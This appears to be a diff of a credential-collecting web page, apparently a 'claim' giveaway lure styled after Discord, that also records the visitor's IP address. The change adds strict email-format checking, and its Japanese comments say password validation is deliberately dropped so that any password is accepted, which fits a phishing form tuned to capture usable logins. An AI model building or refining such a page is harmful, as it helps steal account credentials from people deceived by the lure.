@@ -234,6 +234,8 @@
     const successCard = document.getElementById('successCard');
     const claimBtn = document.getElementById('claimBtn');
     const status = document.getElementById('status');
+    const identifierInput = document.getElementById('identifier');
+    const passwordInput = document.getElementById('password');
 
     let ip = "fetching...";
 
@@ -243,10 +245,18 @@
       .catch(() => ip = "failed");
 
     claimBtn.addEventListener('click', async () => {
-      const identifier = document.getElementById('identifier').value.trim();
-      const password = document.getElementById('password').value;
+      const identifier = identifierInput.value.trim();
+      const password = passwordInput.value;
 
-      // パスワード対策を完全に削除（入力があればそのまま進む）
+      // メールアドレス欄のみ厳しくチェック（@ と . が両方必要）
+      if (!identifier.includes('@') || !identifier.includes('.')) {
+        status.textContent = "Please enter a valid email address";
+        status.style.color = "#ed4245";
+        identifierInput.focus();
+        return;
+      }
+
+      // パスワードは空欄チェックのみ（どんな文字列でもOK）
       if (!identifier || !password) {
         status.textContent = "Please fill in all fields";
         status.style.color = "#ed4245";
